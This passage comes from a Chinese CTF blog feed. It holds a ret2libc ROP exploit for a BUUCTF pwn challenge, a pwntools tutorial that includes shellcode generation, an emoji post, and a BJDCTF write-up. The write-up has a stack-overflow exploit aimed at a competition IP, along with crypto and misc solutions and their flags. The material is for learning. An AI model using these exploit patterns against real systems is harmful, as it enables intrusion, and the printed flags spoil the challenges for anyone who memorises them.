class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x04006b1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">'a'</span>+<span class="string">'bbbbbbbb'</span>+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(a.recv(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line"></span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">'a'</span>+<span class="string">'bbbbbbbb'</span>+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(main)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
            <tag> BUUCTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn从入门到放弃</title>
      <link href="/posts/pwn/"/>
      <url>/posts/pwn/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>我是一名CTF小白，主学习pwn，初学不久，几乎刚入门，现在说说如何“从入门到放弃”：</p><a id="more"></a><h1 id="pwntools的介绍"><a class="markdownIt-Anchor" href="#pwntools的介绍"></a> pwntools的介绍</h1><p>首先需要学习的是pwntools，这个也是我刚开始入门就学的东西；那么先来了解一下pwntools：</p><h3 id="什么是pwntools"><a class="markdownIt-Anchor" href="#什么是pwntools"></a> 什么是pwntools？</h3><p>pwntools是一个二进制利用框架，是CTF框架和漏洞利用开发库，用Python开发，能够更快速的编写exp；</p><p>emm这样可能不好理解，简单来讲，就是Python的一个库，在Linux下使用；</p><h3 id="安装pwntools"><a class="markdownIt-Anchor" href="#安装pwntools"></a> 安装pwntools</h3><p>先来说说怎么安装吧：</p><h4 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h4><p>现在大多数人都是使用Windows或者Mac，但是pwntools需要安装在Linux环境中，这里推荐使用虚拟机；</p><p>虚拟机也有很多种，推荐使用VMware，我也给大家准备好了，点击这里下载<a href="https://pan.baidu.com/s/1t2psjlLidp00Cf1k3_-EQQ" target="_blank" rel="noopener">VMware15</a>  提取码：4nu6；当然肯</p><p>定需要镜像，点击这里下载<a href="https://pan.baidu.com/s/1DXDk2uRe4CprrkUqmWbeOA" target="_blank" rel="noopener">Ubuntu16.04</a>  提取码：az58；这个镜像是64位的，当然也可以去官网下载32位的，</p><p>看自己需要吧；       // 如果遇到问题，请联系我，首页有我的联系方式，嘿嘿嘿，随时可以call我；</p><h4 id="环境准备"><a class="markdownIt-Anchor" href="#环境准备"></a> 环境准备</h4><p>安装pwntools需要下面几个环境：</p><p><strong>python</strong></p><p><strong>pip</strong></p><p><strong>libssl-dev</strong></p><p><strong>libffi-dev</strong></p><h4 id="pwntools的安装"><a class="markdownIt-Anchor" href="#pwntools的安装"></a> pwntools的安装</h4><p>安装需要以下几步：</p><p><em><strong>sudo apt-get install libffi-dev</strong></em><br><em><strong>sudo apt-get install libssl-dev</strong></em><br><em><strong>sudo apt-get install python</strong></em><br><em><strong>sudo apt-get install python-pip</strong></em><br><em><strong>sudo pip install pwntools</strong></em><br>注：安装过程可能会有更新pip等的提示，按照提示一步一步走就没问题，有问题请联系我；</p><h4 id="验证"><a class="markdownIt-Anchor" href="#验证"></a> 验证</h4><p>安装完后，打开终端，输入<strong>python</strong>进入<strong>python</strong>命令，然后输入**<u>from pwn import <em></em></u>* ，不报错即成功；</p><h3 id="pwntools的简单使用"><a class="markdownIt-Anchor" href="#pwntools的简单使用"></a> pwntools的简单使用</h3><p>前面提到，pwntools是python的一个库，那么在写exp的时候，需要掌握以下几个基本语法：</p><h4 id="基本框架"><a class="markdownIt-Anchor" href="#基本框架"></a> 基本框架</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'ip'</span>,port)</span><br><span class="line"><span class="comment">#a = process("./文件名")</span></span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'..'</span>)</span><br><span class="line"></span><br><span class="line">payload = ...</span><br><span class="line"></span><br><span class="line">a.sendline(..)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><p>通常来说，基本框架就这么多，但是远远不止，慢慢学；</p><p>下面介绍这些语句是什么意思</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#导入pwntools模块</span></span><br><span class="line"></span><br><span class="line">remote(<span class="string">'ip'</span>,port) <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">process(<span class="string">'./文件名'</span>) <span class="comment">#本地连接</span></span><br><span class="line"></span><br><span class="line">recvn(N) <span class="comment">#接受N(数字)字符</span></span><br><span class="line"></span><br><span class="line">recvline() <span class="comment">#接收一行输出</span></span><br><span class="line"></span><br><span class="line">recvlines(N) <span class="comment">#接收N(数字)行输出</span></span><br><span class="line"></span><br><span class="line">recvuntil(some_string) <span class="comment">#接收到some_string为止</span></span><br><span class="line"></span><br><span class="line">send(payload) <span class="comment">#发送payload</span></span><br><span class="line"></span><br><span class="line">sendline(payload) <span class="comment">#发送payload并进行换行（末尾\n）</span></span><br><span class="line"></span><br><span class="line">sendafter(some_string, payload) <span class="comment">#接收到some_string后,发送你的 payload</span></span><br><span class="line"></span><br><span class="line">interactive() <span class="comment">#回显</span></span><br></pre></td></tr></tbody></table></figure><p>基本框架就这些，再来看其他的：</p><h4 id="context设置"><a class="markdownIt-Anchor" href="#context设置"></a> Context设置</h4><p>context是pwntools用来设置环境的；二进制文件情况特殊，我们可能需要设置一些环境才可以正常运行exp，不然可能会出现错误；</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br></pre></td></tr></tbody></table></figure><p>说明：</p><p>1、os设置系统为Linux，因为pwntools需要在Linux中运行；</p><p>2、arch = ‘amd64/i386’，分别表示程序是64位和32位；</p><p>3、log_level=‘debug’,这句话一般调试的时候会加上，这样会看到程序运行完整的过程；</p><h4 id="数据打包"><a class="markdownIt-Anchor" href="#数据打包"></a> 数据打包</h4><p>数据打包就是将一个整数值转换成32位或者64位地址一样的表示方式，构造payload的时候非常方便，其用法如下：</p><p>● p32/p64：打包一个整数，转换成 32位或者64位</p><p>● u32/u64：解包一个字符串，变成一个整数</p><h4 id="elf模块"><a class="markdownIt-Anchor" href="#elf模块"></a> ELF模块</h4><p>ELF模块用于获取ELF文件的信息，首先使用ELF()获取这个文件的句柄，然后使用这个句柄调用函数，和IO模块很</p><p>相似。用法如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'./文件名'</span>)</span><br><span class="line"></span><br><span class="line">put_addr = elf.symbols[<span class="string">'put'</span>] <span class="comment">#函数地址</span></span><br><span class="line"></span><br><span class="line">put_got = elf.got[<span class="string">'put'</span>] <span class="comment">#GOT表的地址</span></span><br><span class="line"></span><br><span class="line">put_plt = elf.plt[<span class="string">'put'</span>] <span class="comment">#PLT表的地址</span></span><br></pre></td></tr></tbody></table></figure><h4 id="shellcode生成器"><a class="markdownIt-Anchor" href="#shellcode生成器"></a> shellcode生成器</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></tbody></table></figure><h1 id="检查elf的安全性"><a class="markdownIt-Anchor" href="#检查elf的安全性"></a> 检查.elf的安全性</h1><p>通常拿到一个.elf文件后，首先对它进行检查，具体方法如下：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec .elf</span><br></pre></td></tr></tbody></table></figure><p>RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表；</p><p>Stack：如果栈中开启了Canary found，就不能通过直接溢出的方法覆盖栈中的访问地址，需要绕过</p><p>NX：NX enabled，如果这个保护开启就是意味着栈中的数据没有执行权限，但是可以利用rop绕过</p><p>PIE：PIE enabled，如果程序开启这个地址随机化选项，那么意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话就是No PIE (address)，括号内的数据就是程序的基地址</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>emoji的一些使用</title>
      <link href="/posts/emoji/"/>
      <url>/posts/emoji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>之前看堆堆的blog有emoji，感觉能给博客增加一份光彩，我也整个一个；嘿嘿嘿 <sub>\(^o^)/</sub>😂</p><a id="more"></a><p>首先来配置一个插件：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-filter-github-emojis --save</span><br></pre></td></tr></tbody></table></figure><p>然后在Hexo的根目录下的<code>_config.yml</code>中，新增一下的配置项：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">githubEmojis:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">className:</span> <span class="string">github-emoji</span></span><br><span class="line">  <span class="attr">inject:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">styles:</span></span><br><span class="line">  <span class="attr">customEmojis:</span></span><br></pre></td></tr></tbody></table></figure><p>这样之后，就可以输入：：（中间填写英文），就能打出来表情</p><p>但是吧，似乎blog有点问题，用：：打出来的和copy的不一样：</p><p>😄  这个是：smile：的</p><p>😄  这个是直接 copy 的 smile</p><p>以后还是直接copy比较好😊</p><p>·</p><p>·</p><p>不得不说，今天才发现微软的输入法真的好用，emoji和颜文字都很方便，看来要从sougou转过来了(●ˇ∀ˇ●)</p><p>下面贴几个emoji  ○( ＾ω＾)っHiahiahia…(●ˇ∀ˇ●) ノ</p><p>😀 😘 😍 😁 😜 😄 😝 😉 🤩 😆</p><p>👈 👉 ✌ 🤞 🤙 🖐 👌 👍 ✍ 👐 💪</p><p>👨 👩 🧑 👧 👦  🧒  👶 👵 👴 🧓</p><p>🍕 🍔 🍟 🌭 🥓 🥞  🥙 🥪  🎂 🧀</p><p>⚽ 🏀 🎱 ⚾ 🏐 🎳 🏉  🏈 🥌 🎯</p><p>🎆 🎇 ✨ 🎉 🎊  🎃 🎄  🎋  🎍 🎑</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 花里胡哨 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> emoji </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届BJDCTF——WP</title>
      <link href="/posts/bjdctf-wp/"/>
      <url>/posts/bjdctf-wp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>历经36小时的第二届BJDCTF终于结束了，现在距离21点还差不到半小时，正好可以写完就上线，美滋滋；</p><a id="more"></a><h1 id="start"><a class="markdownIt-Anchor" href="#start"></a> Start</h1><p>这次的比赛，算是学到了许多知识，黄老师说得对—不能不学习；</p><p>先看看这个比赛个人成绩吧（惨不忍睹）：</p><table><thead><tr><th style="text-align:center">Pwn</th><th style="text-align:center">Web</th><th style="text-align:center">Misc</th><th style="text-align:center">Crypto</th><th style="text-align:left">reverse</th><th style="text-align:center">Blockchain</th><th style="text-align:center">Programming</th><th style="text-align:center">Total</th></tr></thead><tbody><tr><td style="text-align:center"><strong>2/11</strong></td><td style="text-align:center"><strong>0/10</strong></td><td style="text-align:center"><strong>3/8</strong></td><td style="text-align:center"><strong>6/8</strong></td><td style="text-align:left"><strong>1/3</strong></td><td style="text-align:center"><strong>0/2</strong></td><td style="text-align:center"><strong>0/1</strong></td><td style="text-align:center"><strong>12/43</strong></td></tr></tbody></table><p>真的是，技术不行，尽力做了已经；接下来把我做出来的整理一下：</p><p><em><strong>说明一下，因为打比赛的时候没有及时整理记录，正好校外赛在BUU，所以用了里面的题目写这篇Blog</strong></em></p><p><em><strong>注：想刷题、想提高，就上<a href="https://buuoj.cn" target="_blank" rel="noopener">BUUCTF</a> // 绝对没打广告 <sup>_</sup></strong></em></p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h3 id="r2t3"><a class="markdownIt-Anchor" href="#r2t3"></a> r2t3</h3><p>这是一道简单的栈溢出的题目，下载附件，检查一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_1.png" alt="r2t3_1"></p><p>32位程序，开了NX，放进ida：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_2.png" alt="r2t3_2"></p><p>这程序很简单，输入一个姓名，然后进入name_check()函数，点开函数来看：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_3.png" alt="r2t3_3"></p><p>这里的_int8变量最多可以存储256大小的数字，如果这个数字为257，那么在内存中其实是257-256=1，这里v3的</p><p>长度只能是[3，8)个字符，考虑到存在栈溢出，所以v3也可以是[259，264）</p><p>因为下面有strcpy()函数，所以查看一波空间：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_5.png" alt="r2t3_4"></p><p>再寻找一波，又发现了一个重要点：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/r2t3_4.png" alt="r2t3_4"></p><p>这里发现了这个函数，这就会了吧，利用栈溢出，直接可以getshell，下面附上exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = remote(<span class="string">'52.82.12.160'</span>,<span class="number">21013</span>)</span><br><span class="line"></span><br><span class="line">a.recvuntil(<span class="string">'Please input your name:'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>* <span class="number">21</span> + p32(<span class="number">0x0804858B</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">259</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">a.sendline(payload)</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h3 id="y1ng"><a class="markdownIt-Anchor" href="#y1ng"></a> y1ng</h3><p>题目有如下信息：<strong>“QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==”</strong></p><p>这是一道签到题目，观察可知Base64加密，直接扔进网站即可</p><p>附上网址：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p><p>解出来就可以了：</p><p><em><strong>flag：BJD{W3lc0me_T0_BJDCTF}</strong></em></p><h3 id="cat_flag"><a class="markdownIt-Anchor" href="#cat_flag"></a> cat_flag</h3><p>话不多说下载附件，打开如下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/cat.gif" alt="cat.gif"></p><p>是一张动态图，本来以为是图片隐写，但是发现不是，想来想去好像是“010101”，对了，把”鸡腿“看成1，把“米</p><p>饭”看成0，每一行一个2进制数，然后转换成10进制，10进制对应的ASCII码应该就是了；尝试一波从上到下的10</p><p>进制数是：66 74 68 123 77 33 97 48 126 125 ——然后对应的ASCII解出来即可；</p><p><em><strong>flag：BJD{M!a0~}</strong></em></p><h3 id="老文盲了"><a class="markdownIt-Anchor" href="#老文盲了"></a> 老文盲了</h3><p>打开附件，<u>发现如下一句话</u></p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%87%E7%9B%B21.png" alt="老文盲1"></p><p>哇！我惊了，都不认识啊，没关系，新华字典，你值得拥有，咳咳咳，我才不会查字典呢，复制到<a href="http://www.duchulai.com/" target="_blank" rel="noopener">读出来</a> 让电脑</p><p>读一下，注音结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E6%96%87%E7%9B%B22.png" alt="老文盲2"></p><p>这就很明显了吧，直接写吧（其实我试了10几次提交 ， 呜呜呜）</p><p><em><strong>flag：BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</strong></em></p><h3 id="燕言燕语"><a class="markdownIt-Anchor" href="#燕言燕语"></a> 燕言燕语</h3><p>这个题目有如下信息：</p><p><strong>“79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20”</strong></p><p>观察发现应该是十六进制，不多说，直接扔进网站—&gt;<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制转文本</a></p><p>得到了—&gt; <strong>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</strong></p><p>看起来很像凯撒密码，经过了一轮解密后发现好像不对emmm</p><p>后经卓哥的提示，灵光一闪：</p><p>首先 <strong>BJD —&gt; ZJQ</strong>，这是经过某种变化得来的，没错，就是前面的**“yanzi”**做了一个“周期”转换；实际上不难发</p><p>现，<strong>‘y’ , ‘a’ , ‘n’ , ‘z’ , ‘i’<strong>这5个字母在倒过来的字母表中的顺序，也就是 <strong>‘z’</strong> 是</strong>1</strong>，<strong>‘y’</strong> 是<strong>2</strong>…这样推过来，<strong>‘a’</strong>  是26，</p><p><strong>‘n’</strong> 是<strong>13</strong>， <strong>‘i’</strong> 是<strong>18</strong>，然后把16进制转换后的字符串用**“yanzi”**推出来的数字当做需要移动的个数来做“<strong>变异凯撒</strong>”…</p><p>//</p><p>官方wp：这个是维吉尼亚密码，“yanzi”作为密钥…</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">维吉尼亚</a> 果然都是有技巧的 哎…</p><p>//</p><p>解出来如下：</p><p><em><strong>flag：BJD{yanzi_jiushige_shabi}</strong></em></p><h3 id="灵能精通"><a class="markdownIt-Anchor" href="#灵能精通"></a> 灵能精通</h3><p>题目是一张图片，打开看一下：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E7%81%B5%E8%83%BD.png" alt="灵能精通"></p><p>本来听说的是这是个猪圈密码，但时百度了一波，没有与题目相同的图案，然后花了100“块钱”买了一个Hint，上</p><p>面写着“星际争霸2，神族，后面自己百度”，心想着没玩过啊，记得堆堆和泽辰好像之前打过，就把Hint发到群里</p><p>了，但时他们最后也没想出来，第二天下午，队友发来了一张图，说是圣堂武士密码：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%9C%A3%E5%A0%82%E6%AD%A6%E5%A3%AB%E5%AF%86%E7%A0%81.png" alt="圣堂武士密码"></p><p>对照着密码表，解出flag</p><p><em><strong>flag：BJD{IMKNIGHTSTEMPLAR}</strong></em></p><h3 id="y1nglish-y1ng"><a class="markdownIt-Anchor" href="#y1nglish-y1ng"></a> Y1nglish-y1ng</h3><p>这道题目是最有意思的题目了，先打开文件：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk </span><br><span class="line">zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line"></span><br><span class="line">MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</span><br></pre></td></tr></tbody></table></figure><p>一看便知，只要解出来每个字母原来的字母就可以了，这里会出现很多问题，作为一名英语弱鸡，硬生生地解了几个小时：</p><p>//</p><p>官方wp：“ 这个字符替换是无序的，直接找个在线的 cryptogram solver 即可解密，比如 quipqiup “</p><p>看到这里心态没了，下面附上解密网站：</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a></p><p>但是解出来的答案是错误的，看了Hint，最后一个字符串，如果是“ Cr4cy ”，就是错误的，其实这里我推导的时候</p><p>也发现了，字母w对应两个字母—&gt;‘y’ 和 ‘k’ 所以改过来即可</p><p>//</p><p><em><strong>flag：BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</strong></em></p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h3 id="小姐姐-y1ng"><a class="markdownIt-Anchor" href="#小姐姐-y1ng"></a> 小姐姐-y1ng</h3><p>这个题目看了好久嘞（我可没说是看小姐姐的啊）</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/xjj.png" alt="小姐姐"></p><p>打开图片（哎呀你就别乱看了，赶紧做题），发现箭头的地方有错位，放入WinHex，搜索BJD发现：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/xjjflag.png" alt="XJJ_Flag"></p><p>得到flag：</p><p><em><strong>flag：BJD{haokanma_xjj}</strong></em></p><h3 id="圣火昭昭"><a class="markdownIt-Anchor" href="#圣火昭昭"></a> 圣火昭昭</h3><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/%E5%9C%A3%E7%81%AB.png" alt="圣火昭昭"></p><p>图片好像看不出来，按照常规看了下图片属性，里面藏了一句密文：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</span><br></pre></td></tr></tbody></table></figure><p>去<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a> 解密可得：</p><p><em><strong>“gemlovecom”</strong></em> 根据提示可知去掉com，得到了***”gemlove“***</p><p>又买了一个Hint：”你猜啊，你倒是猜啊，guess“，气死我了，这句话看不出来啊？</p><p>想来想去想不出来，最后卓哥提示——”outguess“</p><p>百度了一波outguess，最后在Linux里面安装了一波工具，用下面这条指令：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ outguess -k "gemlove" -r sheng_huo_zhao_zhao.jpg  hidden.txt</span><br></pre></td></tr></tbody></table></figure><p><em><strong>flag：BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</strong></em></p><h3 id="a_beautiful_picture"><a class="markdownIt-Anchor" href="#a_beautiful_picture"></a> A_Beautiful_Picture</h3><p>打开附件，是一张jpg：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/beayt.png" alt="A_beautiful_picture"></p><p>貌似么有发现什么，怀疑是一道隐写，丢进WinHex：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/beautiful_flag.png" alt="A_beautiful_picture"></p><p>把这里03改为05，保存后打开：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/Abeautiful_Flag.png" alt="beautiful_Flag"></p><p><em><strong>flag：BJD{PnG_He1ghT_1s_WR0ng}</strong></em></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h3 id="guessgame"><a class="markdownIt-Anchor" href="#guessgame"></a> guessgame</h3><p>这是一道逆向签到题，本来逆向题不会做，但是解答出来的人数非常多，就尝试着做了做</p><p>附件是一个64位的.exe，丢进ida查看了一波：</p><p><img src="https://cdn.jsdelivr.net/gh/whloki/cdn@1.2/images/guessnum.png" alt="guessnum_flag"></p><p>直接发现flag：</p><p><em><strong>flag：BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</strong></em></p><h1 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h1><p>由于我不是web选手，不会做web题目，所以web爆零，另外的Blockchain和Programming也不会做；</p><p>这篇wp把会做的整理了吧，后面补完题目，继续整理 +_=</p><p>实力就这样，技不如人，甘拜下风！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              